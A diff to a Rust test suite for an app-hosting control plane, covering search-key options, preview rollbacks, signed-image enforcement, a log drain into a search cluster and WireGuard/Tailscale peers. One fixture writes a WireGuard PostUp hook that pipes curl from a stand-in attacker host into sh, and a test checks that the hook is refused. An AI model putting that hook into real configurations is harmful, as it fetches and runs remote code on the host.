@@ -179,6 +179,8 @@ static BRANCHED: Mutex<Vec<String>> = Mutex::new(Vec::new());
 static MINTED: Mutex<Vec<String>> = Mutex::new(Vec::new());
 /// While set, a `logs` link waits (a while at most) for a second one to reach the provider too,
 /// so two requests racing to make one link both get there whatever the machine's load.
+/// The options each link was made with (a search key's indices and access).
+static LINK_OPTIONS: Mutex<Vec<Value>> = Mutex::new(Vec::new());
 static RACING: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
 static RACE: std::sync::LazyLock<tokio::sync::Barrier> = std::sync::LazyLock::new(|| tokio::sync::Barrier::new(2));
 
@@ -191,7 +193,8 @@ impl apps_control::integrations::Resources for FakeResources {
         }
     }
 
-    async fn link(&self, kind: apps_control::model::LinkKind, r#ref: &str, service: &str) -> anyhow::Result<Option<apps_control::integrations::Minted>> {
+    async fn link(&self, kind: apps_control::model::LinkKind, r#ref: &str, service: &str, options: &apps_control::integrations::LinkOptions) -> anyhow::Result<Option<apps_control::integrations::Minted>> {
+        LINK_OPTIONS.lock().push(serde_json::Value::Object(options.clone()));
         if (kind.as_str(), r#ref) != ("search", "logs") {
             return Ok(None);
         }
@@ -1677,6 +1680,21 @@ async fn a_link_puts_its_variables_in_the_instances() {
     let log: Vec<String> = MINTED.lock()[before..].to_vec();
     assert_eq!(log.iter().filter(|l| l.starts_with("link ")).count(), 2, "{log:?}");
     assert_eq!(log.iter().filter(|l| l.starts_with("unlink ")).count(), 1, "the loser's goes: {log:?}");
+    // Narrowed (roll search's keys: a SaaS's tenants' indices, read only): a new key made with
+    // the options replaces the link's, and the old one is revoked; the same options again make
+    // nothing; append takes exact names only; other kinds take none.
+    assert_eq!(call(&w.api, "PUT", &path, Some(json!({"indices": ["tenant-*"], "access": "append"}))).await.0, StatusCode::BAD_REQUEST);
+    assert_eq!(call(&w.api, "PUT", &format!("/v1/apps/services/{rid}/links/postgres/main"), Some(json!({"indices": ["x"]}))).await.0, StatusCode::BAD_REQUEST);
+    let before = MINTED.lock().len();
+    let (st, l) = call(&w.api, "PUT", &path, Some(json!({"indices": ["tenant-*"], "access": "read"}))).await;
+    assert_eq!((st, &l["indices"], &l["access"]), (StatusCode::OK, &json!(["tenant-*"]), &json!("read")), "{l}");
+    assert_eq!(LINK_OPTIONS.lock().last(), Some(&json!({"names": ["tenant-*"], "permission": "read"})));
+    let log: Vec<String> = MINTED.lock()[before..].to_vec();
+    assert!(log.len() == 2 && log[0].starts_with("link ") && log[1].starts_with("unlink "), "a new key, the old revoked: {log:?}");
+    assert_eq!(call(&w.api, "PUT", &path, Some(json!({"indices": ["tenant-*"], "access": "read"}))).await.0, StatusCode::OK);
+    assert_eq!(MINTED.lock().len(), before + 2, "the same options make nothing");
+    let listed = call(&w.api, "GET", &format!("/v1/apps/services/{rid}/links"), None).await.1;
+    assert!(listed.as_array().unwrap().iter().any(|l| l["kind"] == "search" && l["access"] == "read" && l["indices"] == json!(["tenant-*"])), "{listed}");
 }
 
 /// An environment's own data (`data: "branch"`, Railway's environments' own databases): its
@@ -3292,6 +3310,80 @@ async fn a_sandbox_runs_commands_apart_from_the_environment_until_its_end() {
     assert!(w.fake.state(&name).is_none() && !w.fake.networks().contains(&net));
 }
 
+/// A view of a deployment with values of its own (roll previews' earlier pushes on their own
+/// copy of the data): its image again at its own URL with some of the environment's variables
+/// given other values, never live, never listed, no one told to put it live.
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn a_view_of_a_deployment_runs_its_image_with_values_of_its_own() {
+    let w = world().await;
+    let (svc, _) = image_service(&w, "api", json!({"port": 80})).await;
+    let id = svc["id"].as_str().unwrap().to_string();
+    let base = format!("/v1/apps/services/{id}/environments/production");
+    assert!(call(&w.api, "PATCH", &format!("{base}/variables"), Some(json!({"set": {"DATABASE_URL": "postgres://live", "FAKE_ECHO": "DATABASE_URL"}}))).await.0.is_success());
+    let (_, d) = call(&w.api, "POST", &format!("{base}/deploys"), Some(json!({}))).await;
+    let live = d["id"].as_str().unwrap().to_string();
+    settled(&w, &id, "production", &live).await;
+    let rollback = format!("{base}/deploys/{live}/rollback");
+    assert_eq!(call(&w.api, "POST", &rollback, Some(json!({"variables": {"DATABASE_URL": "postgres://copy"}}))).await.0, StatusCode::BAD_REQUEST, "never live");
+    assert_eq!(call(&w.api, "POST", &rollback, Some(json!({"no_traffic": true, "variables": {"NEW_ONE": "x"}}))).await.0, StatusCode::BAD_REQUEST, "only the environment's own names");
+    assert_eq!(call(&w.api, "POST", &rollback, Some(json!({"no_traffic": true}))).await.0, StatusCode::BAD_REQUEST);
+    let (st, v) = call(&w.api, "POST", &rollback, Some(json!({"no_traffic": true, "variables": {"DATABASE_URL": "postgres://copy"}}))).await;
+    assert_eq!(st, StatusCode::ACCEPTED, "{v}");
+    let view = v["id"].as_str().unwrap().to_string();
+    let done = settled(&w, &id, "production", &view).await;
+    assert_eq!(done["status"], "ready", "{done}");
+    let events = call(&w.api, "GET", "/v1/apps/events?after=0", None).await.1;
+    assert!(!events["events"].as_array().unwrap().iter().any(|e| e["kind"] == "deploy.ready" && e["deployment"] == view.as_str()), "no one is told to put a view live");
+    // Its URL runs it with the copy's value; the environment's keeps its own.
+    let h = host(&call(&w.api, "GET", &base, None).await.1["url"]);
+    let (st, at_view) = visit(&w, &host(&done["url"]), "/").await;
+    assert_eq!((st, &at_view["vars"]["DATABASE_URL"]), (StatusCode::OK, &json!("postgres://copy")), "{at_view}");
+    assert_eq!(visit(&w, &h, "/").await.1["vars"]["DATABASE_URL"], "postgres://live");
+    assert!(!call(&w.api, "GET", &format!("{base}/variables"), None).await.1.to_string().contains("postgres://copy"), "never listed");
+}
+
+/// Signed images (Cloud Run's Binary Authorization): with a project's signing keys required, an
+/// image service's deploy needs its pinned digest's cosign signature by one of them, or it fails
+/// before anything switches; removing the rule lets unsigned images deploy again.
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn a_project_that_requires_signed_images_refuses_unsigned_ones() {
+    use p256::pkcs8::EncodePublicKey;
+    let w = world().await;
+    let (svc, d1) = image_service(&w, "api", json!({"port": 80})).await;
+    let id = svc["id"].as_str().unwrap().to_string();
+    let deploys = format!("/v1/apps/services/{id}/environments/production/deploys");
+    let signing = format!("/v1/apps/projects/{}/signing", w.project);
+    assert_eq!(call(&w.api, "PUT", &signing, Some(json!({"keys": ["not a key"]}))).await.0, StatusCode::BAD_REQUEST);
+    let pem = p256::ecdsa::SigningKey::from_bytes(&[7u8; 32].into()).unwrap().verifying_key().to_public_key_pem(Default::default()).unwrap();
+    let (st, v) = call(&w.api, "PUT", &signing, Some(json!({"keys": [pem]}))).await;
+    assert_eq!((st, &v["required"]), (StatusCode::OK, &json!(true)), "{v}");
+    let (_, d) = call(&w.api, "POST", &deploys, Some(json!({}))).await;
+    let d = settled(&w, &id, "production", d["id"].as_str().unwrap()).await;
+    assert!(d["status"] == "failed" && d["error"].as_str().unwrap_or_default().contains("requires signed images"), "{d}");
+    assert_eq!(call(&w.api, "GET", &format!("/v1/apps/services/{id}/environments/production"), None).await.1["active"]["id"], d1["id"], "nothing switched");
+    // Signed by the project's key: it deploys, and its log says so.
+    w.fake.signatures.lock().insert("nginx:1.27".into(), 0);
+    let (_, d) = call(&w.api, "POST", &deploys, Some(json!({}))).await;
+    let dep = d["id"].as_str().unwrap().to_string();
+    assert_eq!(settled(&w, &id, "production", &dep).await["status"], "active");
+    let (_, logs) = call(&w.api, "GET", &format!("{deploys}/{dep}/logs"), None).await;
+    assert!(logs.to_string().contains("cosign signature verifies"), "{logs}");
+    // A sidecar runs with the app's values: its image too.
+    assert!(call(&w.api, "PATCH", &format!("/v1/apps/services/{id}"), Some(json!({"run": {"sidecars": [{"name": "cache", "image": "redis:7"}]}}))).await.0.is_success());
+    let (_, d) = call(&w.api, "POST", &deploys, Some(json!({}))).await;
+    let d = settled(&w, &id, "production", d["id"].as_str().unwrap()).await;
+    assert!(d["status"] == "failed" && d["error"].as_str().unwrap_or_default().contains("sidecar cache"), "{d}");
+    w.fake.signatures.lock().insert("redis:7".into(), 0);
+    let (_, d) = call(&w.api, "POST", &deploys, Some(json!({}))).await;
+    assert_eq!(settled(&w, &id, "production", d["id"].as_str().unwrap()).await["status"], "active");
+    // A sandbox of another image: checked as a deploy's, refused unsigned; the live one's runs.
+    let sandboxes = format!("/v1/apps/services/{id}/environments/production/sandboxes");
+    assert_eq!(call(&w.api, "POST", &sandboxes, Some(json!({"image": "python:3.13-slim"}))).await.0, StatusCode::FORBIDDEN);
+    assert_eq!(call(&w.api, "POST", &sandboxes, None).await.0, StatusCode::CREATED);
+    assert_eq!(call(&w.api, "DELETE", &signing, None).await.0, StatusCode::NO_CONTENT);
+    assert_eq!(call(&w.api, "GET", &signing, None).await.1, json!({"keys": [], "required": false}));
+}
+
 #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
 async fn a_one_off_job_runs_the_live_image_to_its_exit_and_can_be_canceled() {
     let w = world_with(|c| c.cron_retry_after = Duration::from_millis(20)).await;
@@ -3664,7 +3756,7 @@ impl apps_control::integrations::Resources for FakeBucket {
     async fn link_vars(&self, _kind: apps_control::model::LinkKind, r#ref: &str) -> anyhow::Result<Vec<(String, String)>> {
         Ok(vec![("S3_BUCKET".into(), r#ref.into()), ("AWS_ENDPOINT_URL".into(), self.endpoint.clone()), ("AWS_REGION".into(), "eu-central-1".into())])
     }
-    async fn link(&self, _kind: apps_control::model::LinkKind, r#ref: &str, to: &str) -> anyhow::Result<Option<apps_control::integrations::Minted>> {
+    async fn link(&self, _kind: apps_control::model::LinkKind, r#ref: &str, to: &str, _options: &apps_control::integrations::LinkOptions) -> anyhow::Result<Option<apps_control::integrations::Minted>> {
         self.seen.lock().push(format!("key {to} {ref}"));
         Ok(Some(apps_control::integrations::Minted { vars: vec![("AWS_ACCESS_KEY_ID".into(), "AKIAMINTED".into()), ("AWS_SECRET_ACCESS_KEY".into(), "minted-secret".into())], kept: "AKIAMINTED".into() }))
     }
@@ -3709,6 +3801,85 @@ async fn a_drain_into_the_projects_bucket_has_a_key_of_its_own() {
     assert_eq!(call(&w.api, "PATCH", &format!("{base}/{id}"), Some(json!({"headers": {"aws-access-key-id": "mine", "aws-secret-access-key": "x"}}))).await.0, StatusCode::BAD_REQUEST, "its key is roll's");
     assert!(call(&w.api, "DELETE", &format!("{base}/{id}"), None).await.0.is_success());
     assert_eq!(*fake.seen.lock(), [format!("key drain:{} logs", w.project), "revoked AKIAMINTED".to_string()]);
+}
+
+/// roll search as a drain sees it: a cluster at `endpoint`, its data stream made as asked, a key
+/// minted with the link's options (what was asked and revoked, kept).
+struct FakeSearch {
+    endpoint: String,
+    seen: Mutex<Vec<String>>,
+}
+
+#[async_trait]
+impl apps_control::integrations::Resources for FakeSearch {
+    async fn link_vars(&self, _kind: apps_control::model::LinkKind, _ref: &str) -> anyhow::Result<Vec<(String, String)>> {
+        Ok(vec![("ELASTICSEARCH_URL".into(), self.endpoint.clone())])
+    }
+    async fn link(&self, _kind: apps_control::model::LinkKind, r#ref: &str, to: &str, options: &apps_control::integrations::LinkOptions) -> anyhow::Result<Option<apps_control::integrations::Minted>> {
+        self.seen.lock().push(format!("key {to} {ref} {}", Value::Object(options.clone())));
+        Ok(Some(apps_control::integrations::Minted { vars: vec![("ELASTICSEARCH_API_KEY".into(), "sk_append".into())], kept: "key_1".into() }))
+    }
+    async fn log_stream(&self, cluster: &str, stream: &str, retention_days: u32) -> anyhow::Result<()> {
+        self.seen.lock().push(format!("stream {cluster} {stream} {retention_days}d"));
+        Ok(())
+    }
+    async fn unlink(&self, _kind: apps_control::model::LinkKind, _ref: &str, kept: &str) -> anyhow::Result<()> {
+        self.seen.lock().push(format!("revoked {kept}"));
+        Ok(())
+    }
+}
+
+/// A drain into the project's roll search cluster (Elastic's and OpenSearch's ingestion): its
+/// own data stream made with its retention, a key minted for it that only appends there, lines
+/// as ECS documents through `_bulk` (`create` actions), the key revoked with the drain.
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn a_drain_into_a_search_cluster_appends_ecs_documents() {
+    let got: Arc<parking_lot::Mutex<Vec<(String, String, String)>>> = Default::default();
+    let g = got.clone();
+    let app = axum::Router::new().fallback(move |uri: axum::http::Uri, h: axum::http::HeaderMap, b: bytes::Bytes| {
+        let g = g.clone();
+        async move {
+            g.lock().push((uri.path().to_string(), h.get("authorization").and_then(|v| v.to_str().ok()).unwrap_or_default().to_string(), String::from_utf8_lossy(&b).to_string()));
+            axum::Json(json!({"errors": false, "items": []}))
+        }
+    });
+    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let endpoint = format!("http://{}", l.local_addr().unwrap());
+    tokio::spawn(axum::serve(l, app).into_future());
+    let fake = Arc::new(FakeSearch { endpoint, seen: Mutex::new(Vec::new()) });
+    let f2 = fake.clone();
+    let w = world_full(|_| {}, false, move |d| d.resources = f2).await;
+    let base = format!("/v1/apps/projects/{}/drains", w.project);
+    assert_eq!(call(&w.api, "POST", &base, Some(json!({"search": "logs"}))).await.0, StatusCode::BAD_REQUEST, "not on the project");
+    let ws = w.apps.deps.workspace.clone().unwrap();
+    ws.place(roll_workspace::Scope::All, &w.project, roll_workspace::Kind::Search, "logs", 0.0, 0.0).unwrap();
+    assert_eq!(call(&w.api, "POST", &base, Some(json!({"search": "logs", "url": "https://x.example"}))).await.0, StatusCode::BAD_REQUEST);
+    assert_eq!(call(&w.api, "POST", &base, Some(json!({"search": "logs", "namespace": "Web-1"}))).await.0, StatusCode::BAD_REQUEST);
+    let (st, d) = call(&w.api, "POST", &base, Some(json!({"search": "logs", "namespace": "web", "retention_days": 7}))).await;
+    assert_eq!((st, d["format"].as_str(), d["stream"].as_str()), (StatusCode::CREATED, Some("search"), Some("logs-roll.apps-web")), "{d}");
+    assert!(!d.to_string().contains("sk_append"), "its key isn't shown");
+    assert_eq!(fake.seen.lock()[..2], ["stream logs logs-roll.apps-web 7d".to_string(), format!("key drain:{} logs {}", w.project, json!({"names": ["logs-roll.apps-web"], "permission": "append"}))]);
+    let id = d["id"].as_str().unwrap().to_string();
+    assert_eq!(call(&w.api, "POST", &format!("{base}/{id}/test"), None).await.1["ok"], true);
+    // A runtime line, as an ECS document appended to the stream with the drain's key.
+    let (svc, _) = image_service(&w, "api", json!({"port": 80})).await;
+    visit(&w, &host(&svc["environments"][0]["url"]), "/").await;
+    let mut bulk = String::new();
+    for _ in 0..200 {
+        if let Some((_, _, b)) = got.lock().iter().find(|(_, _, b)| b.contains("listening on")) {
+            bulk = b.clone();
+            break;
+        }
+        tokio::time::sleep(Duration::from_millis(25)).await;
+    }
+    let (path, auth, _) = got.lock().last().cloned().unwrap();
+    assert_eq!((path.as_str(), auth.as_str()), ("/logs-roll.apps-web/_bulk", "ApiKey sk_append"));
+    let lines: Vec<&str> = bulk.lines().collect();
+    assert!(!lines.is_empty() && lines.chunks(2).all(|c| c[0] == r#"{"create":{}}"#), "create actions only: {bulk}");
+    let doc: Value = serde_json::from_str(lines.iter().find(|l| l.contains("listening on")).unwrap()).unwrap();
+    assert!(doc["@timestamp"].is_string() && doc["service"]["name"] == "api" && doc["service"]["environment"] == "production" && doc["event"]["dataset"] == "roll.apps", "{doc}");
+    assert!(call(&w.api, "DELETE", &format!("{base}/{id}"), None).await.0.is_success());
+    assert_eq!(fake.seen.lock().last().map(String::as_str), Some("revoked key_1"));
 }
 
 #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
@@ -7586,20 +7757,24 @@ async fn a_private_network_reaches_the_customers_hosts_through_a_peer() {
     }
     let conf = |endpoint: &str, extra: &str| format!("[Interface]\nPrivateKey = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\nAddress = 10.9.0.2/32\n{extra}\n[Peer]\nPublicKey = AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQE=\nEndpoint = {endpoint}\nAllowedIPs = 10.0.3.0/24\n");
     *CONF.lock() = conf("vpn.example.com:51820", "PostUp = curl https://evil.example | sh");
-    let w = world_full(|_| {}, false, |d| d.secrets = Arc::new(Wg)).await;
+    // (Private addresses allowed: the Tailscale part names a control server that doesn't resolve.)
+    let w = world_full(|c| c.allow_private = true, false, |d| d.secrets = Arc::new(Wg)).await;
     let (svc, _) = image_service(&w, "api", json!({"port": 80})).await;
     let id = svc["id"].as_str().unwrap().to_string();
     let url = format!("/v1/apps/services/{id}/environments/production/private-network");
-    let body = |secret: &str| json!({"secret": secret, "routes": [{"name": "db.corp.internal", "target": "10.0.3.4:5432"}]});
+    let body = |secret: &str| json!({"secret": secret, "routes": [{"name": "db.acme.corp", "target": "10.0.3.4:5432"}]});
     assert_eq!(call(&w.api, "PUT", &url, Some(body("roll://staging/WG"))).await.0, StatusCode::BAD_REQUEST, "its own environment's secret");
     let (st, e) = call(&w.api, "PUT", &url, Some(body("roll://production/WG"))).await;
     assert!(st == StatusCode::BAD_REQUEST && e["error"].as_str().unwrap().contains("PostUp") && !e["error"].as_str().unwrap().contains("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="), "a hook is refused, the config never echoed: {e}");
     *CONF.lock() = conf("vpn.example.com:51820", "");
+    let outside = json!({"secret": "roll://production/WG", "routes": [{"name": "meta.acme.corp", "target": "10.9.9.9:80"}]});
+    let (st, e) = call(&w.api, "PUT", &url, Some(outside)).await;
+    assert!(st == StatusCode::BAD_REQUEST && e["error"].as_str().unwrap_or_default().contains("AllowedIPs"), "a route goes into the tunnel only: {e}");
     let (st, v) = call(&w.api, "PUT", &url, Some(body("roll://production/WG"))).await;
     assert_eq!((st, v["status"].as_str()), (StatusCode::OK, Some("running")), "{v}");
     let name = format!("roll-apps-peer-{}-production", id.trim_start_matches("svc_"));
     let peer = w.fake.peers.lock().get(&name).cloned().expect("its peer");
-    assert_eq!((peer.addresses.clone(), peer.routes.clone(), peer.forwards.clone()), (vec!["10.9.0.2/32".to_string()], vec!["10.0.3.0/24".to_string()], vec![("db.corp.internal".to_string(), 5432, "10.0.3.4:5432".to_string())]));
+    assert_eq!((peer.addresses.clone(), peer.routes.clone(), peer.forwards.clone()), (vec!["10.9.0.2/32".to_string()], vec!["10.0.3.0/24".to_string()], vec![("db.acme.corp".to_string(), 5432, "10.0.3.4:5432".to_string())]));
     assert!(peer.network == apps_control::network_name(&w.project, "production") && peer.config.contains("Endpoint = vpn.example.com:51820") && !peer.config.contains("Address"), "{peer:?}");
     // Another service there can't answer the same name.
     let (other, _) = image_service(&w, "web", json!({"port": 80})).await;
@@ -7608,8 +7783,15 @@ async fn a_private_network_reaches_the_customers_hosts_through_a_peer() {
     // Rotated in roll secrets: the peer has the new one within the minute.
     *CONF.lock() = conf("vpn2.example.com:51820", "");
     w.apps.cron_pass(code_sql::now_ms() + 61_000).await;
+    // (The minute's check runs each peer on its own: waited for.)
+    for _ in 0..200 {
+        if w.fake.peers.lock().get(&name).is_some_and(|p| p.config.contains("vpn2.example.com")) {
+            break;
+        }
+        tokio::time::sleep(Duration::from_millis(10)).await;
+    }
     assert!(w.fake.peers.lock().get(&name).is_some_and(|p| p.config.contains("vpn2.example.com")));
-    assert_eq!(call(&w.api, "GET", &url, None).await.1["routes"][0]["name"], "db.corp.internal");
+    assert_eq!(call(&w.api, "GET", &url, None).await.1["routes"][0]["name"], "db.acme.corp");
     assert_eq!(call(&w.api, "DELETE", &url, None).await.0, StatusCode::NO_CONTENT);
     assert!(w.fake.peers.lock().is_empty() && call(&w.api, "GET", &url, None).await.0 == StatusCode::NOT_FOUND);
     // A closed environment's: on its closed network, out through a network of the peer's own.
@@ -7623,7 +7805,7 @@ async fn a_private_network_reaches_the_customers_hosts_through_a_peer() {
     let peer = w.fake.peers.lock().get(&format!("roll-apps-peer-{}-staging", id.trim_start_matches("svc_"))).cloned().unwrap();
     assert_eq!((peer.network.clone(), peer.out_network.clone()), (apps_control::closed_network_name(&w.project, "staging"), Some(format!("roll-apps-peer-{}-staging-out", id.trim_start_matches("svc_")))));
     // A Tailscale node instead: its auth key from roll secrets, a Headscale server if named.
-    let ts = json!({"kind": "tailscale", "secret": "roll://staging/WG", "login_server": "https://hs.example.com/", "routes": [{"name": "api.corp.internal", "target": "api.tail1234.ts.net:443"}]});
+    let ts = json!({"kind": "tailscale", "secret": "roll://staging/WG", "login_server": "https://hs.example.com/", "routes": [{"name": "api.acme.corp", "target": "api.tail1234.ts.net:443"}]});
     assert_eq!(call(&w.api, "PUT", &staging, Some(ts.clone())).await.0, StatusCode::BAD_REQUEST, "a WireGuard config isn't an auth key");
     *CONF.lock() = "tskey-auth-k1234567CNTRL-abcdefghijklmnop".into();
     let (st, v) = call(&w.api, "PUT", &staging, Some(ts)).await;
@@ -8683,7 +8865,14 @@ async fn closed_services_on_one_network_move_to_a_new_ca_together() {
     assert!(!ended(), "web still uses them: {:?}", vault.0.lock());
     let (_, d) = call(&w.api, "POST", &format!("/v1/apps/services/{web}/environments/staging/deploys"), Some(json!({}))).await;
     settled(&w, &web, "staging", d["id"].as_str().unwrap()).await;
-    w.apps.cron_pass(code_sql::now_ms() + 60 * 60_000).await;
+    // (web's closed instances still draining keep them until they're gone: checked each minute.)
+    for i in 0..100 {
+        w.apps.cron_pass(code_sql::now_ms() + (60 + i) * 61_000).await;
+        if ended() {
+            break;
+        }
+        tokio::time::sleep(Duration::from_millis(20)).await;
+    }
     assert!(ended(), "{:?}", vault.0.lock());
 }
 
